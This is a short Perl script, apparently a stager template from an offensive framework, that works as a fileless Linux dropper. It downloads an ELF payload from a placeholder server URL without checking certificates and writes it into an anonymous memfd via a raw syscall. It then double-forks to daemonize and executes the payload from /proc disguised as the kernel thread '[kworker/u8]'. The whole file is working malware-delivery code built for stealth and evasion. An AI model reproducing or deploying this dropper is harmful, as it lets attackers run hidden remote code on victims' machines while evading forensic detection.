#!/usr/bin/env perl
use warnings;
use strict;
use HTTP::Tiny;
use POSIX;

# credits:
# https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html
# https://0x00sec.org/t/super-stealthy-droppers/3715/9
# https://blog.fbkcs.ru/elf-in-memory-execution/

# e.g. http://localhost/payload.elf
my $DOWNLOAD_URL = "§SRVURL§";

# disguise as kernel process
my $MEMFD_NAME = "1";
my $PROCESS_NAME = "[kworker/u8]";

# /usr/include/linux/memfd.h
my $MFD_CLOEXEC = 0x0001;

# detect architecture
my $arch = (POSIX::uname)[4];
my $NR_MEMFD_CREATE;
if ($arch eq "x86_64") {
  # /usr/include/asm/unistd_64.h
  $NR_MEMFD_CREATE = 319;
} elsif ($arch eq "i386") {
  # /usr/include/asm/unistd_32.h
  $NR_MEMFD_CREATE = 279;
} elsif ($arch eq "arm64") {
  $NR_MEMFD_CREATE = 385;
} else {
  die "unsupported cpu architecture";
}

# download payload without checking https certificates
my $http = HTTP::Tiny->new();
my $response = $http->get($DOWNLOAD_URL);
die "http->get: $response->{reason}" unless $response->{success};

# call memfd_create(name, flags)
my $fd = syscall($NR_MEMFD_CREATE, $MEMFD_NAME, $MFD_CLOEXEC);
if ($fd < 0) {
    die "memfd_create: $!";
}

# write payload to memory
open(my $fh, '>&=', $fd) or die "open: $!";
select((select($fh), $|=1)[0]);
binmode $fh;
print $fh $response->{content};

# daemonize
my $pid = fork();
if ($pid < 0) {
    die "fork: $!";
} elsif ($pid > 0) {
    exit 0;
}
my $sid = POSIX::setsid();
if ($sid < 0) {
    die "setsid: $!";
}
$pid = fork();
if ($pid < 0) {
    die "fork: $!";
} elsif ($pid > 0) {
    exit 0;
}

# execute payload
exec {"/proc/$$/fd/$fd"} $PROCESS_NAME or die "exec: $!";
